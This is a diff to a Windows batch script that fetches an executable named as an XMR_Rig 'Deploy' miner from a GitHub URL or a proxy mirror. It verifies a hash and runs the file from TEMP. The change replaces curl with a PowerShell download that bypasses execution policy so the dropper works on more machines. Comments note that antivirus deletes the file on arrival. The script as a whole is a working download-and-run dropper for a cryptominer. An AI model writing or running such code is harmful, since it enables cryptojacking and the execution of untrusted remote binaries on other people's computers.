@@ -1,6 +1,10 @@
 @echo off
 rem Fetch XMR_Rig_6.26-Deploy-100.exe into TEMP and run it.
 rem
+rem Downloads through PowerShell (Invoke-WebRequest) because every Windows 10
+rem and 11 ships it, while curl only appeared in 1803 and can be stripped by
+rem enterprise policy.
+rem
 rem Nothing here is hidden or obfuscated.  If this machine's real-time
 rem protection is on, the file is deleted the moment it lands and this script
 rem says so instead of pretending it worked.
@@ -14,24 +18,18 @@ set "URL=https://github.com/acu715/acu715/raw/refs/heads/main/Mining/XMR_Rig_6.2
 set "MIRROR=https://gh-proxy.com/https://github.com/acu715/acu715/raw/refs/heads/main/Mining/XMR_Rig_6.26-Deploy-100.exe"
 set "SHA256=9c55370958a86e0c8294be24e93a83829ff69d806b980abf033f74b338682e0d"
 
-if exist "XMR_Rig_6.26-Deploy-100.exe" (
-    call :CHECK_HASH "XMR_Rig_6.26-Deploy-100.exe"
+if exist "%EXE%" (
+    call :CHECK_HASH "%EXE%"
     if "!HASH_OK!"=="1" (
         echo [OK] already in TEMP, hash verified.
         goto :RUN
     )
     echo [..] TEMP copy is stale, refetching.
-    del /q "XMR_Rig_6.26-Deploy-100.exe" 2>nul
+    del /q "%EXE%" 2>nul
 )
 
-where curl >nul 2>nul
-if errorlevel 1 (
-    echo [ERROR] curl not found.  Needs Windows 10 1803 or newer.
-    goto :FAIL
-)
-
-rem github.com first.  --connect-timeout caps the wait at 5s when the route is
-rem blackholed, and the direct attempt does not retry so the fallback is quick.
+rem github.com first.  -TimeoutSec caps the wait when the route is blackholed,
+rem and the direct attempt does not retry so the fallback is quick.
 set "GOT=0"
 call :FETCH "%URL%" direct 0
 if "!GOT!"=="1" goto :HAVE
@@ -41,8 +39,8 @@ if "!GOT!"=="1" goto :HAVE
 goto :NODOWNLOAD
 
 :HAVE
-move /y "XMR_Rig_6.26-Deploy-100.exe.tmp" "XMR_Rig_6.26-Deploy-100.exe" >nul
-if not exist "XMR_Rig_6.26-Deploy-100.exe" goto :EATEN
+move /y "%EXE%.tmp" "%EXE%" >nul
+if not exist "%EXE%" goto :EATEN
 echo [OK] downloaded and verified.
 
 :RUN
@@ -75,25 +73,24 @@ for /f "delims=" %%H in ('certutil -hashfile "%~1" SHA256 ^| findstr /r /i "^[0-
 )
 if not defined HASH_ACTUAL exit /b 1
 set "HASH_ACTUAL=!HASH_ACTUAL: =!"
-if /i "!HASH_ACTUAL!"=="9c55370958a86e0c8294be24e93a83829ff69d806b980abf033f74b338682e0d" set "HASH_OK=1"
+if /i "!HASH_ACTUAL!"=="%SHA256%" set "HASH_OK=1"
 exit /b 0
 
 :FETCH
 echo [..] trying %~2 ...
-rem No --max-time: curl already aborts a stalled transfer on its own
-rem (--speed-limit 1 / --speed-time 30 by default), and a total cap only
-rem punishes a slow mirror -- which is the one that has to work.
-curl -fL --retry %~3 --connect-timeout 5 -o "XMR_Rig_6.26-Deploy-100.exe.tmp" "%~1"
+rem retries = %~3: direct tries once, the mirror three times.
+rem $ProgressPreference off: the progress renderer is the slow part of IWR.
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue'; $ok=$false; for($i=0;$i -le %~3;$i++){ try { Invoke-WebRequest -Uri '%~1' -OutFile '%EXE%.tmp' -TimeoutSec 90 -UseBasicParsing; $ok=$true; break } catch { Start-Sleep 3 } }; if(-not $ok){ exit 1 }"
 if errorlevel 1 (
     echo [..] %~2 failed.
-    del /q "XMR_Rig_6.26-Deploy-100.exe.tmp" 2>nul
+    del /q "%EXE%.tmp" 2>nul
     exit /b 0
 )
-if not exist "XMR_Rig_6.26-Deploy-100.exe.tmp" goto :EATEN
-call :CHECK_HASH "XMR_Rig_6.26-Deploy-100.exe.tmp"
+if not exist "%EXE%.tmp" goto :EATEN
+call :CHECK_HASH "%EXE%.tmp"
 if not "!HASH_OK!"=="1" (
     echo [..] %~2 returned a bad or truncated file.
-    del /q "XMR_Rig_6.26-Deploy-100.exe.tmp" 2>nul
+    del /q "%EXE%.tmp" 2>nul
     exit /b 0
 )
 set "GOT=1"
